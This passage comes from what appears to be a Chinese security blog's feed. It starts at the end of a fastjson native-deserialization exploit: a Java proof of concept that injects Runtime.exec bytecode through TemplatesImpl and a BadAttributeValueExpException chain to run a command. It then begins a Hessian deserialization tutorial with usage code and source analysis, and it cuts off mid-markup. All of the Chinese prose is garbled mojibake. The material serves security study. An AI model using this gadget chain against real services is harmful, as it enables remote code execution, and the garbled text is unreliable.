class_">fastjson1Usual1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] genPayload(String cmd) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="hljs-string">&quot;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">49</span>);<br>        <span class="hljs-keyword">return</span> clazz.toBytecode();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;genPayload(<span class="hljs-string">&quot;calc&quot;</span>)&#125;);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">bd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setValue(bd,<span class="hljs-string">&quot;val&quot;</span>,jsonArray);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(templates,bd);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));<br>        objectInputStream.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;çœ‹äº†fastjsonçš„å„ç‰ˆæœ¬é“¾å­ï¼Œå†çœ‹ä¸€ä¸‹fastjsonçš„åŸç”Ÿååºåˆ—åŒ–ï¼Œçœ‹çš„æ˜¯y4å¸ˆå‚…çš„ä¸¤ç¯‡æ–‡ç« &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="ååºåˆ—åŒ–" scheme="https://clowsman.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Hessianååºåˆ—åŒ–</title>
    <link href="https://clowsman.github.io/2024/10/08/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/10/08/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-10-08T09:21:49.000Z</published>
    <updated>2024-10-10T14:57:50.438Z</updated>
    
    <content type="html"><![CDATA[<p>æ¥å­¦ä¸€ä¸‹Hessianååºåˆ—åŒ–ï¼Œä¸»è¦å‚è€ƒsu18å¸ˆå‚…çš„æ–‡ç« ï¼š</p><h1 id="hessianç®€ä»‹"><a href="#Hessianç®€ä»‹" class="headerlink" title="Hessianç®€ä»‹"></a>Hessianç®€ä»‹</h1><p>ç›´æ¥æŠ„su18å¸ˆå‚…é‡Œé¢çš„</p><p>Hessian æ˜¯ <a href="https://caucho.com/">caucho</a> å…¬å¸çš„å·¥ç¨‹é¡¹ç›®ï¼Œä¸ºäº†è¾¾åˆ°æˆ–è¶…è¿‡ ORMI&#x2F;Java JNI ç­‰å…¶ä»–è·¨è¯­è¨€&#x2F;å¹³å°è°ƒç”¨çš„èƒ½åŠ›è®¾è®¡è€Œå‡ºï¼Œåœ¨ 2004 ç‚¹å‘å¸ƒ 1.0 è§„èŒƒï¼Œä¸€èˆ¬ç§°ä¹‹ä¸º Hessian ï¼Œå¹¶é€æ­¥è¿­ä»£ï¼Œåœ¨ Hassian jar 3.2.0 ä¹‹åï¼Œé‡‡ç”¨äº†æ–°çš„ 2.0 ç‰ˆæœ¬çš„åè®®ï¼Œä¸€èˆ¬ç§°ä¹‹ä¸º Hessian 2.0ã€‚</p><p>è¿™æ˜¯ä¸€ç§åŠ¨æ€ç±»å‹çš„<a href="http://hessian.caucho.com/doc/hessian-serialization.html">äºŒè¿›åˆ¶åºåˆ—åŒ–</a>å’Œ <a href="http://hessian.caucho.com/doc/hessian-ws.html">Web æœåŠ¡</a>åè®®ï¼Œä¸“ä¸ºé¢å‘å¯¹è±¡çš„ä¼ è¾“è€Œè®¾è®¡ã€‚Hessian åè®®åœ¨è®¾è®¡æ—¶ï¼Œé‡ç‚¹çš„å‡ ä¸ªç›®æ ‡åŒ…æ‹¬äº†ï¼šå¿…é¡»å°½å¯èƒ½çš„å¿«ã€å¿…é¡»å°½å¯èƒ½ç´§å‡‘ã€è·¨è¯­è¨€ã€ä¸éœ€è¦å¤–éƒ¨æ¨¡å¼æˆ–æ¥å£å®šä¹‰ç­‰ç­‰ã€‚</p><p>å¯¹äºè¿™æ ·çš„è®¾è®¡ï¼Œcaucho å…¬å¸å…¶å®æä¾›äº†ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼Œä¸€ä¸ªæ˜¯ Hessianï¼Œä¸€ä¸ªæ˜¯ Burlapã€‚Hession æ˜¯åŸºäºäºŒè¿›åˆ¶çš„å®ç°ï¼Œä¼ è¾“æ•°æ®æ›´å°æ›´å¿«ï¼Œè€Œ Burlap çš„æ¶ˆæ¯æ˜¯ XML çš„ï¼Œæœ‰æ›´å¥½çš„å¯è¯»æ€§ã€‚ä¸¤ç§æ•°æ®éƒ½æ˜¯åŸºäº HTTP åè®®ä¼ è¾“ã€‚</p><p>Hessian æœ¬èº«ä½œä¸º <a href="https://caucho.com/products/resin">Resin</a> çš„ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯å®ƒçš„ <code>com.caucho.hessian.client</code> å’Œ <code>com.caucho.hessian.server</code> åŒ…ä¸ä¾èµ–äºä»»ä½•å…¶ä»–çš„ Resin ç±»ï¼Œå› æ­¤å®ƒä¹Ÿå¯ä»¥ä½¿ç”¨ä»»ä½•å®¹å™¨å¦‚ Tomcat ä¸­ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨åœ¨ EJB ä¸­ã€‚äº‹å®ä¸Šå¾ˆå¤šé€šè®¯æ¡†æ¶éƒ½ä½¿ç”¨æˆ–æ”¯æŒäº†è¿™ä¸ªè§„èŒƒæ¥åºåˆ—åŒ–åŠååºåˆ—åŒ–ç±»ã€‚</p><p>ä½œä¸ºä¸€ä¸ªäºŒè¿›åˆ¶çš„åºåˆ—åŒ–åè®®ï¼ŒHessian è‡ªè¡Œå®šä¹‰äº†ä¸€å¥—è‡ªå·±çš„å‚¨å­˜å’Œè¿˜åŸæ•°æ®çš„æœºåˆ¶ã€‚å¯¹ 8 ç§åŸºç¡€æ•°æ®ç±»å‹ã€3 ç§é€’å½’ç±»å‹ã€ref å¼•ç”¨ä»¥åŠ Hessian 2.0 ä¸­çš„å†…éƒ¨å¼•ç”¨æ˜ å°„è¿›è¡Œäº†ç›¸å…³å®šä¹‰ã€‚è¿™æ ·çš„è®¾è®¡ä½¿å¾— Hassian å¯ä»¥è¿›è¡Œè·¨è¯­è¨€è·¨å¹³å°çš„è°ƒç”¨ã€‚</p><p>æœ‰å…³Hessianåè®®å’Œå…¶ä»–åè®®çš„å¯¹æ¯”ä»¥åŠååºåˆ—åŒ–åŸç†å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://blog.csdn.net/ByteDanceTech/article/details/126188189">https://blog.csdn.net/ByteDanceTech/article/details/126188189</a></p><h1 id="ç®€å•ä½¿ç”¨"><a href="#ç®€å•ä½¿ç”¨" class="headerlink" title="ç®€å•ä½¿ç”¨"></a>ç®€å•ä½¿ç”¨</h1><p>su18å¸ˆå‚…çš„æ–‡ç« é‡Œé¢æä¾›äº†å¤šç§ä½¿ç”¨æ–¹å¼ï¼Œè¿™é‡Œæ¥å¤åˆ»ä¸€ä¸‹</p><h2 id="åŸºäºservlet"><a href="#åŸºäºServlet" class="headerlink" title="åŸºäºServlet"></a>åŸºäºServlet</h2><p>å®šä¹‰ä¸€ä¸ªæ–¹æ³•æ¥å£</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Greeting</span> &#123;<br>    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(HashMap o)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœåŠ¡ç«¯åˆ›å»ºè¯¥æ–¹æ³•çš„å…·ä½“å®ç°ï¼Œå¹¶ç»§æ‰¿com.caucho.hessian.server.HessianServletæ¥å°†å…¶æ ‡è®°ä¸ºä¸€ä¸ªæä¾›æœåŠ¡çš„Servlet</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.server.HessianServlet;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.*;<br><br><span class="hljs-meta">@WebServlet(name = &quot;hessian&quot;, value = &quot;/hessian&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HessianServlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Greeting</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(HashMap o)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello &quot;</span>+o.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åéœ€è¦é…ç½®Servletæ˜ å°„ï¼Œæˆ‘è¿™é‡Œç›´æ¥ç”¨äº†æ³¨è§£ï¼Œä¹Ÿå¯ä»¥ç”¨web.xmlæ¥é…ç½®</p><p>Client ç«¯é€šè¿‡ <code>com.caucho.hessian.client.HessianProxyFactory</code> å·¥å‚ç±»åˆ›å»ºå¯¹æ¥å£çš„ä»£ç†å¯¹è±¡ï¼Œå¹¶è¿›è¡Œè°ƒç”¨ï¼Œå¯ä»¥çœ‹åˆ°è°ƒç”¨åæ‰§è¡Œäº†æœåŠ¡ç«¯çš„é€»è¾‘å¹¶è¿”å›äº†ç»“æœã€‚</p><blockquote><p>è¿™ä¸€éƒ¨åˆ†å’ŒRMIçš„è¿œç¨‹è°ƒç”¨ç±»ä¼¼ï¼Œéƒ½æ˜¯é€šè¿‡ä»£ç†åˆ›å»ºå¯¹è±¡æ¥æ‰§è¡Œæ–¹æ³•çš„ï¼Œç­‰ä¼šåˆ†ææºç çš„æ—¶å€™ä¹Ÿä¼šçœ‹åˆ°</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.client.HessianProxyFactory;<br><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://localhost:8080/HessianServlet_war_exploded/hessian&quot;</span>;<br>        <span class="hljs-type">HessianProxyFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianProxyFactory</span>();<br>        <span class="hljs-type">Greeting</span> <span class="hljs-variable">greeting</span> <span class="hljs-operator">=</span> (Greeting) factory.create(Greeting.class, url);<br>        HashMap&lt;Object, Object&gt; object = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        object.put(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;Hessian Call: &quot;</span>+greeting.sayHello(object));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410091058542.png" alt="image-20241009105834433"></p><p>è¿™é‡ŒHessianå¹¶ä¸éœ€è¦åƒRMIé‚£æ ·æ¥å£çš„åŒ…åéœ€è¦ç›¸åŒã€‚</p><h2 id="åŸºäºspring"><a href="#åŸºäºSpring" class="headerlink" title="åŸºäºSpring"></a>åŸºäºSpring</h2><p>Spring-web åŒ…å†…æä¾›äº† <code>org.springframework.remoting.caucho.HessianServiceExporter</code> ç”¨æ¥æš´éœ²è¿œç¨‹è°ƒç”¨çš„æ¥å£å’Œå®ç°ç±»ã€‚ä½¿ç”¨è¯¥ç±» export çš„ Hessian Service å¯ä»¥è¢«ä»»ä½• Hessian Client è®¿é—®ï¼Œå› ä¸º Spring ä¸­é—´æ²¡æœ‰è¿›è¡Œä»»ä½•ç‰¹æ®Šå¤„ç†ã€‚</p><p>ä» spring-web-5.3 åï¼Œè¯¥ç±»è¢«æ ‡è®°ä¸º <code>@Deprecated</code> ï¼Œ ä¹Ÿå°±æ˜¯è¯´ spring åœ¨é€æ¸æ·˜æ±°å¯¹åŸºäºåºåˆ—åŒ–çš„è¿œç¨‹è°ƒç”¨çš„ç›¸å…³æ”¯æŒã€‚</p><blockquote><p>æˆ‘è¿™é‡Œä¸€å¼€å§‹springboot3é‡Œé¢çš„spring-webæ˜¯6.1.13çš„ç‰ˆæœ¬ï¼Œæ˜¯ç›´æ¥è¿HessianServiceExporterè¿™ä¸ªç±»ä¹Ÿæ‰¾ä¸åˆ°äº†</p></blockquote><p>è¿™é‡Œå°±ä¸å°è¯•äº†ï¼Œcopyä¸€ä¸‹å®˜æ–¹æ–‡æ¡£çš„ä»£ç ç¤ºä¾‹ï¼š<a href="https://www.baeldung.com/spring-remoting-hessian-burlap">https://www.baeldung.com/spring-remoting-hessian-burlap</a></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean(name = &quot;/booking&quot;)</span> <br>RemoteExporter <span class="hljs-title function_">bookingService</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">HessianServiceExporter</span> <span class="hljs-variable">exporter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianServiceExporter</span>();<br>    exporter.setService(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CabBookingServiceImpl</span>());<br>    exporter.setServiceInterface( CabBookingService.class );<br>    <span class="hljs-keyword">return</span> exporter;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯æš´éœ²æœåŠ¡çš„ä»£ç ï¼Œå®¢æˆ·ç«¯åŒæ ·ç”¨å‰é¢çš„å³å¯ï¼Œåªéœ€è¦æ”¹ä¸€ä¸‹url</p><p>ä»–è¿˜æœ‰ä½¿ç”¨Burlapåè®®çš„å†™æ³•</p><p>æš´éœ²æœåŠ¡ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean(name = &quot;/booking&quot;)</span> <br>RemoteExporter <span class="hljs-title function_">burlapService</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">BurlapServiceExporter</span> <span class="hljs-variable">exporter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BurlapServiceExporter</span>();<br>    exporter.setService(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CabBookingServiceImpl</span>());<br>    exporter.setServiceInterface( CabBookingService.class );<br>    <span class="hljs-keyword">return</span> exporter;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> BurlapProxyFactoryBean <span class="hljs-title function_">burlapInvoker</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">BurlapProxyFactoryBean</span> <span class="hljs-variable">invoker</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BurlapProxyFactoryBean</span>();<br>    invoker.setServiceUrl(<span class="hljs-string">&quot;http://localhost:8080/booking&quot;</span>);<br>    invoker.setServiceInterface(CabBookingService.class);<br>    <span class="hljs-keyword">return</span> invoker;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†™æ³•åŸºæœ¬å’Œä½¿ç”¨hessianä¸€è‡´</p><h2 id="è‡ªå°è£…è°ƒç”¨"><a href="#è‡ªå°è£…è°ƒç”¨" class="headerlink" title="è‡ªå°è£…è°ƒç”¨"></a>è‡ªå°è£…è°ƒç”¨</h2><p>å°±æ˜¯é€šè¿‡å¯¹ <code>HessianInput/HessianOutput</code>ã€<code>Hessian2Input/Hessian2Output</code>ã€<code>BurlapInput/BurlapOutput</code> çš„ç›¸å…³æ–¹æ³•çš„å°è£…ï¼Œå¯ä»¥è‡ªè¡Œå®ç°ä¼ è¾“ã€å­˜å‚¨ç­‰é€»è¾‘ï¼Œä½¿ç”¨ Hessian è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ•°æ®ã€‚</p><p>è¿™é‡Œçš„Inputå’ŒOutputæ–¹æ³•å°±æ˜¯ç›´æ¥è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ–¹æ³•ï¼Œå‰é¢çš„è°ƒç”¨ä¹Ÿéƒ½æ˜¯å¯¹è¿™äº›æ–¹æ³•è¿›è¡Œäº†å°è£…ï¼ŒOutputå°±æ˜¯åºåˆ—åŒ–å‡ºå»ï¼ŒInputå°±æ˜¯ååºåˆ—åŒ–</p><p>Inputæ–¹æ³•éƒ½ç»§æ‰¿è‡ªAbstractHessianInputè¿™ä¸ªæŠ½è±¡ç±»</p><p><img src="https://cdn.clown2024.cn/202410091608295.png" alt="image-20241009160850197"></p><p>Outputæ–¹æ³•åˆ™ç»§æ‰¿AbstractHessianOutputæŠ½è±¡ç±»</p><p><img src="https://cdn.clown2024.cn/202410091609188.png" alt="image-20241009160949153"></p><p>è¿™é‡Œå°è£…æˆä¸€ä¸ªå·¥å…·ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HessianUtil</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Hessianåºåˆ—åŒ–</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> obj</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object obj) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">byte</span>[] result=<span class="hljs-literal">null</span>;<br>        Hessian2Output oo=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(bos);<span class="hljs-comment">//å°è£…å­—èŠ‚æµ</span><br>        oo.writeObject(obj);<span class="hljs-comment">//å†™å…¥åºåˆ—åŒ–å¯¹è±¡å­—èŠ‚æµ</span><br>        oo.flush();<br>        result=bos.toByteArray();<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Hessianååºåˆ—åŒ–</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> bytes</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        Hessian2Input oi=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bis);<br>        <span class="hljs-keyword">return</span> oi.readObject();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="jndiè°ƒç”¨"><a href="#JNDIè°ƒç”¨" class="headerlink" title="JNDIè°ƒç”¨"></a>JNDIè°ƒç”¨</h2><p>Hessian è¿˜å¯ä»¥é€šè¿‡å°† HessianProxyFactory é…ç½®ä¸º JNDI Resource çš„æ–¹å¼æ¥è°ƒç”¨ã€‚çœ‹æ–‡ç« æ˜¯ç”¨äº†resinæ¥é…ç½®çš„ï¼Œæˆ‘æ²¡æŸ¥åˆ°web.xmlçš„é…ç½®ï¼Œæˆªä¸ªæ–‡ç« çš„å›¾çŸ¥é“ä¸€ä¸‹ç®—äº†</p><p><img src="https://cdn.clown2024.cn/202410091644186.png" alt="image-20241009164415140"></p><h1 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h1><h2 id="æ¥å£è°ƒç”¨"><a href="#æ¥å£è°ƒç”¨" class="headerlink" title="æ¥å£è°ƒç”¨"></a>æ¥å£è°ƒç”¨</h2><p>é‚£å‰é¢çš„åŸºäºServletçš„ä»£ç å…ˆæ¥åˆ†æï¼ŒHessianServletæ˜¯HttpServletçš„å­ç±»ï¼Œé‚£ä¹ˆHessianServlet çš„<code>init</code> æ–¹æ³•å°†ä¼šæ‰¿æ‹…ä¸€äº›åˆå§‹åŒ–çš„åŠŸèƒ½ï¼Œè€Œ <code>service</code> æ–¹æ³•å°†ä¼šæ˜¯ç›¸å…³å¤„ç†çš„èµ·å§‹ä½ç½®ã€‚</p><p>è¯¥ç±»çš„æˆå‘˜å˜é‡</p><p><img src="https://cdn.clown2024.cn/202410091650586.png" alt="image-20241009165055536"></p><p><code>_homeAPI</code>(è°ƒç”¨ç±»çš„æ¥å£ Class)ã€<code>_homeImpl</code>(å…·ä½“å®ç°ç±»çš„å¯¹è±¡)ã€<code>_serializerFactory</code>(åºåˆ—åŒ–å·¥å‚ç±»)ã€<code>_homeSkeleton</code>(å°è£…æ–¹æ³•)</p><p>çœ‹ä¸€ä¸‹initæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410091655779.png" alt="image-20241009165531713"></p><p>å°±æ˜¯å¯¹å„å˜é‡è¿›è¡Œåˆ¤æ–­æ˜¯å¦ä¸ºç©ºæ¥è¿›è¡Œåˆå§‹åŒ–ï¼Œå®ƒé‡Œé¢è°ƒç”¨äº†loadClassæ–¹æ³•æ¥åŠ è½½ç±»ï¼Œä¸è¿‡ä»–è¿™é‡Œè‡ªå·±é‡å†™äº†ä¸€ä¸ªloadClass</p><p><img src="https://cdn.clown2024.cn/202410091716251.png" alt="image-20241009171609208"></p><p><img src="https://cdn.clown2024.cn/202410091716148.png" alt="image-20241009171618113"></p><p>è¿™é‡Œä¼˜å…ˆä»çº¿ç¨‹è·å–ç±»åŠ è½½å™¨ï¼Œåº”è¯¥æ˜¯ä¸ºäº†æ›´å¿«åŠ è½½åˆ°å¯¹åº”çš„ç±»ï¼Œé¿å…èµ°åŒäº²å§”æ´¾çš„æµç¨‹ï¼Œçº¿ç¨‹çš„é»˜è®¤çš„ç±»åŠ è½½å™¨æ˜¯AppClassLoader</p><p>ç„¶åçœ‹ä»–çš„serviceæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410091723880.png" alt="image-20241009172300818"></p><p>å¯ä»¥çœ‹åˆ°åªæ”¯æŒPOSTè¯·æ±‚ï¼Œè·å–idæˆ–è€…ejbidä½œä¸ºobjectIdï¼Œç„¶åè®¾ç½®ä¸€ä¸ªå“åº”å¤´ï¼Œå†å»è°ƒç”¨invokeæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410091724012.png" alt="image-20241009172457963"></p><p>ç„¶åå°±æ ¹æ®objectIdæ˜¯å¦ä¸ºç©ºæ¥é€‰æ‹©è°ƒç”¨çš„æ–¹æ³•</p><p>å…ˆçœ‹ä¸€ä¸‹ç¬¬ä¸€ä¸ªæ–¹æ³•com.caucho.hessian.server.HessianSkeleton#invoke</p><p>è¯¥ç±»çš„çˆ¶ç±»æ˜¯AbstractSkeletonï¼Œè¯¥ç±»å¯¹Hessianæä¾›çš„æœåŠ¡è¿›è¡Œå°è£…</p><p><img src="https://cdn.clown2024.cn/202410091929088.png" alt="image-20241009192918042"></p><p>å…¶å°†æ–¹æ³•ã€æ–¹æ³•åç­‰ä¿å­˜åœ¨_methodMapé‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202410091932778.png" alt="image-20241009193223729"></p><p>ç„¶åHessianSkeletonåˆå§‹åŒ–å°±å°†è‡ªå·±çš„å®ç°ç±»ä¿å­˜åœ¨_serviceå˜é‡é‡Œé¢</p><p>è¯¥ç±»é‡Œé¢è¿˜æœ‰ä¸¤ä¸ªæˆå‘˜å˜é‡è¦çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202410091937552.png" alt="image-20241009193725504"></p><p>ä¸¤ä¸ªå·¥å‚ç±»ï¼ŒHessianInputFactoryå°±æ˜¯ç”¨æ¥è¯»å–å’Œåˆ›å»ºHessianInput&#x2F;Hessian2Input æµï¼ŒHessianFactoryç”¨æ¥</p><p>åˆ›å»ºHessianInput&#x2F;Hessian2Input&#x2F;HessianOutput&#x2F;Hessian2Outputæµ</p><p>å¯¹ç±»åŸºæœ¬äº†è§£åå›è¿‡å¤´ç»§ç»­çœ‹invokeæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410091949119.png" 